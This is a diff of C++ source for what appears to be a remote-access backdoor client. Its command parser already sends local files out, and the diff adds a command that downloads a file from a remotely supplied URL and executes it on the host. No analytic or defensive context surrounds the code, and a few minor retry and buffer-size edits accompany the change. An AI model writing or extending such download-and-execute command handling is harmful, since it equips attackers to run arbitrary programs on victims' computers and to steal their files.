@@ -24,10 +24,9 @@ bool Client::CheckSslReturnCode(int iRet){
 		default:
 			#ifdef _DEBUG
 			std::cout<<"error "<<iTmp<<'\n';
-			ERR_print_errors_fp(stderr);
 			#endif
 			if(!isRetry){
-				sleep(10);
+				Sleep(10000);
 				isRetry = true;
 			}
 			isRetry = false;
@@ -148,7 +147,7 @@ void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocal
 	int iRet = 0;
 	std::ofstream strmOutputFile(strLocalFileName, std::ios::binary);
 	if(!strmOutputFile.is_open()){
-		if(GetEnvironmentVariable("TEMP", cDummyFile, 1023) <= 0){
+		if(GetEnvironmentVariable("TEMP", cDummyFile, 1011) <= 0){
 			#ifdef _DEBUG
 			std::cout<<"Unable to retrieve temp directory using dummy2.t3mp\n";
 			#endif
@@ -253,6 +252,29 @@ bool Client::ParseCommand(char*& strCommand){
 			if(SendFile(vcCommands[1])){
 				#ifdef _DEBUG
 				std::cout<<"Send success\n";
+				#endif
+			}
+			goto release;
+		}
+		if(vcCommands[0] == CommandCodes::cHttpd){
+			if(Download(vcCommands[1].c_str(), strLocalFileName)){
+				#ifdef _DEBUG
+				std::cout<<"\nDownload success\n";
+				#endif
+				if(vcCommands[2] == "1"){
+					#ifdef _DEBUG
+					std::cout<<"Executing file "<<strLocalFileName<<'\n';
+					#endif
+					if(!Misc::Execute(strLocalFileName.c_str(), 1)){
+						#ifdef _DEBUG
+						std::cout<<"Unable to execute program\n";
+						error();
+						#endif
+					}
+				}
+			} else {
+				#ifdef _DEBUG
+				std::cout<<"\nUnable to download file\n";
 				#endif
 			}
 			goto release;
